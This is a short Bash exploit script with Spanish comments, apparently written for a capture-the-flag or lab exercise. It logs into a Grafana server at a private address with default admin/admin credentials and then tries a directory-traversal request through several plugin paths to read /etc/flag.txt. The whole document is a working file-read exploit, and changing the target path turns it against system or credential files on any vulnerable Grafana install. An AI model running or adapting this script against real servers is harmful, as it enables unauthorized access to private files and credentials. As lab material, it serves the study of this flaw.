#!/bin/bash

# Configuración
TARGET="http://172.20.0.15:3000"
USERNAME="admin"
PASSWORD="admin"
COOKIE_FILE="cookies.txt"
FLAG_PATH="/etc/flag.txt"
PLUGINS=("alertlist" "barchart" "logs" "text" "stat" "table" "piechart" "dashlist" "clock")

# Paso 1: Login y guardar la cookie
echo "[*] Autenticando con Grafana en $TARGET..."
curl -s -c $COOKIE_FILE -X POST "$TARGET/login" \
  -H "Content-Type: application/json" \
  -d "{\"user\":\"$USERNAME\",\"password\":\"$PASSWORD\"}" > /dev/null

# Verificar login
if grep -q "grafana_session" "$COOKIE_FILE"; then
  echo "[+] Login exitoso. Cookie guardada en $COOKIE_FILE"
else
  echo "[!] Falló el login. Revisa las credenciales."
  exit 1
fi

# Paso 2: Intentar path traversal con sesión activa
echo "[*] Buscando flag en $FLAG_PATH..."

for plugin in "${PLUGINS[@]}"; do
  echo -n "  [+] Probando plugin: $plugin... "
  RESPONSE=$(curl -s -b $COOKIE_FILE "$TARGET/public/plugins/$plugin/../../../../../../../../$FLAG_PATH")

  if echo "$RESPONSE" | grep -q 'FLAG{' ; then
    echo "✔️  ¡FLAG encontrada!"
    echo
    echo "$RESPONSE" | grep 'FLAG{'
    exit 0
  else
    echo "no"
  fi
done

echo "[!] No se encontró la FLAG. Revisa la ruta o los plugins."

